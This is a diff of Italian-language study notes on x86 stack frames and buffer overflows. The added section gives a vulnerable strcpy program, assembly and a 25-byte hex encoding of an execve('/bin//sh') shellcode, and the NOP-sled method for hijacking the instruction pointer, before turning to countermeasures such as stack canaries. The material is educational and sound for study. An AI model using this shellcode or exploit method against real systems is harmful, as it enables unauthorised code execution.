@@ -105,7 +105,7 @@ Ogni funzione inizia con un **preambolo**:
 ```assembly
 push 	ebp      ; Salvo sullo stack il valore del vecchio base pointer EBP
 mov 	ebp,esp  ; Sostituisco il vecchio base pointer con lo stack pointer per creare lo stack frame
-sub 	esp,0x10 ; Faccio crescere lo stack di 16 byte, o 4 celle
+sub 	esp,value ; Faccio crescere lo stack di value/4 celle
 ```
 e termina con un **prologo**:
 ```assembly
@@ -115,6 +115,9 @@ ret
 ```
 #### Buffer overflow
 Un **buffer overlow** é un **bug software** che si verifica quando dei dati vengono copiati in un’area di memoria ed eccedono lo spazio riservato per quella variabile.
+
+Infatti lo stack puó crescere verso il basso, ma i buffer vengono riempiti verso l'alto, dall'indirizzo piú basso a quello piú alto.
+![[Pasted image 20230910220325.png|300]]
 
 Presentiamo quí sotto un esempio:
 ```c
@@ -153,7 +156,60 @@ you win!
 Questo esempio é molto semplice, ma i buffer overflow possono essere utilizzati per:
 - **eseguire codice arbitrario**, modificando l'instruction pointer
 - **Sovrascrivere interi frame**
+##### Esecuzione di shellcode
+Prendiamo in esame questa variante:
+```c
+#include <stdio.h>
+#include <string.h>
+int main(int argc, char *argv[]){
+	char buf[100];
+	strcpy(buf, argv[1]);
+	printf("Welcome %s\n", buf);
+	return 0;
+}
+```
+Questo prende il primo valore passato come argomento(`argv[0]` é il nome del file).
 
+Lo stack sará quindi una cosa del genere 
+![[Pasted image 20230910222058.png|200]]
+Lo stack cresce verso il basso(indirizzi piú bassi), il buffer viene riempito verso l'alto. 
+
+Siamo in grado di eseguire un buffer overflow in maniera molto semplice
+![[Pasted image 20230910223205.png]]
+
+Osservando un dump dello stack 
+![[Pasted image 20230910223052.png|600]]
+possiamo notare come abbiamo sovrascritto anche il base pointer e l'instruction pointer
+![[Pasted image 20230910223134.png|300]]
+
+Possiamo quindi scrivere uno shellcode
+```asm
+xor     eax, eax    ; Clearing eax register
+push    eax         ; Pushing NULL bytes
+push    0x68732f2f  ; Pushing //sh
+push    0x6e69622f  ; Pushing /bin
+mov     ebx, esp    ; ebx now has address of /bin//sh
+push    eax         ; Pushing NULL byte
+mov     edx, esp    ; edx now has address of NULL byte
+push    ebx         ; Pushing address of /bin//sh
+mov     ecx, esp    ; ecx now has address of address
+                    ; of /bin//sh byte
+mov     al, 11      ; syscall number of execve is 11
+int     0x80        ; Make the system call
+
+```
+compilarlo ed eseguire l'objectdump per ottenere una shellcode compatta di appena 25 byte
+```
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
+```
+
+Inserendola come input siamo in grado di inserirla nel buffer, ma non ne conosciamo l'esatto indirizzo. Per questo motivo possiamo riempire il resto del buffer di istruzioni `NOP`, creando una Nop-sled, cosí da non dovercene preccupare, poiché con queste operazioni si passerá alla successiva fino a raggiungere la prima istruzione della shell.
+![[Pasted image 20230910224105.png|600]]
+La struttura dell'input malevolo che forniremo all'uitente sará quindi:
+- nop-slead in cima
+- subito dopo la payload
+
+Possiamo sovrascrivere quindi l'istruction pointer ad un indirizzo della nop-slead per eseguire la nostra shell.
 ##### Contromisure
 Negli anni sono stati presentati delle contromisure, piú o meno efficaci:
 - **Canarino**: un valore noto scritto sullo stack tra il buffer e levariabili locali per rilevare i buffer overflow. Esso viene inserito durante la compilazione con l'idea che, in caso di bof, sarebbe il primo valore ad essere sovrascritto, e in caso di alterazione, l'esecuzione verrebbe bloccata.
